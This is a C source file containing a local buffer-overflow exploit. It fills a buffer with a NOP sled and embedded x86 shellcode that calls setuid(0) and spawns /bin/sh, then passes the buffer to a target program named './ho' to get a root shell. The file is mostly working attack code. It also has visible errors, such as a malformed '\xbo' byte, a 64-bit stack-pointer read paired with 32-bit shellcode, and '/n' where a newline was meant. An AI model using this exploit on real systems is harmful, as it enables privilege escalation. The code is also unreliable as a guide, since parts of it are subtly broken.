#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<stdlib.h>

char shellcode[] =
      "\x31\xc0\x31\xdb\xbo\x17\xcd\x80" //setuid 0 first
      "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"      
      "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
      "\x80\xe8\xdc\xff\xff\xff/bin/sh";
   
     unsigned long get_sp(void){
        __asm__  ("mov %rsp , %rax");
       }
      
    int main(int argc , char *argv[1]) {
       int i , offset = 0;
       unsigned int esp , ret , *addr_ptr;
       char *buffer , *ptr;
       int size = 500;
      
      esp = get_sp();
      if(argc > 1) size = atoi(argv[1]);
      if(argc > 2) offset = atoi(argv[2]);
      if(argc > 3) esp = strtoul(argv[3] , NULL , 0);
      ret = esp - offset;
 
       fprintf(stderr , "Usage: %s<buff_size> <offset> <esp:0xfff...> /n" , argv[0]);
      fprintf(stderr , "ESP:0x%x offset:0x%x Return:0x%x\n" , esp , offset ,ret);
      buffer = (char *)malloc(size);
      ptr = buffer;
      addr_ptr = (unsigned int *) ptr;
     for(i=0; i <size/2; i++){
        buffer[i] = '\x90';
       }  
     
     ptr = buffer + size/2;
     for(i=0; i <strlen(shellcode); i++){
        *(ptr++) = shellcode[i];
}
        char run[] = "./ho";
        buffer[size-1]=0;
        execle( run ,"meet" ,"Mr"  ,buffer , 0);
        printf("%s\n" , buffer);
        free(buffer);
        return 0;
}
